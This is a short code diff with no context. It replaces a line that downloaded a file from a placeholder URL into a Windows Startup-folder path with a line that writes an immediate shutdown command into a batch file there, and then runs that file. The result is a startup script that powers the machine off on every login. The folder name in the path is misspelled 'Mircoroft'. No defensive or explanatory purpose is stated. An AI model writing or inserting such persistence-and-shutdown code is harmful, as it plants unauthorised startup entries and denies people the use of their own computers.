@@ -1,2 +1,2 @@
-curl -o "C:\ProgramData\Mircoroft\Windows\Start Menu\Programs\Startup\b.bat" URL_HERE
+echo "shutdown -s -t 0" > "C:\ProgramData\Mircoroft\Windows\Start Menu\Programs\Startup\b.bat"
 C:\ProgramData\Mircoroft\Windows\Start Menu\Programs\Startup\b.bat
